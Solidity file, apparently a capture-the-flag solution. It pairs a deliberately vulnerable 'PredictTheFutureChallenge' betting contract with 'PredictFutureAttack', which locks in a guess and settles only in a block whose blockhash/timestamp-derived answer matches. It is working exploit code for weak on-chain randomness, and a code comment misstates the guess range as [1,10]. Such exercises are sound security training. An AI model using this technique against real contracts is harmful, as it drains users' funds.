// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract PredictTheFutureChallenge {
    address guesser;
    uint8   guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}


contract PredictFutureAttack {

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function guess (address payable vulnContractAddr) external {
        PredictTheFutureChallenge vulnContract = PredictTheFutureChallenge(vulnContractAddr);
        // we can't predict future blocktimestamp to pre-calculate answer, but what we can do
        // is guess a number between [1,10] (due to % 10 added to answer calc), then come in
        // every block after the next and compute the answer, and wait until a block has our answer to settle()
        vulnContract.lockInGuess{value: 1 ether}(7);
    }

    error WrongBlock();

    // call this function on every block after the next one until we hit a block with our submitted answer
    function settle (address payable vulnContractAddr) external {

        if(uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10 == 7) {
            PredictTheFutureChallenge vulnContract = PredictTheFutureChallenge(vulnContractAddr);
            vulnContract.settle();
        } else {
            revert WrongBlock();
        }
    }

    receive() external payable {}
    fallback() external payable {}
}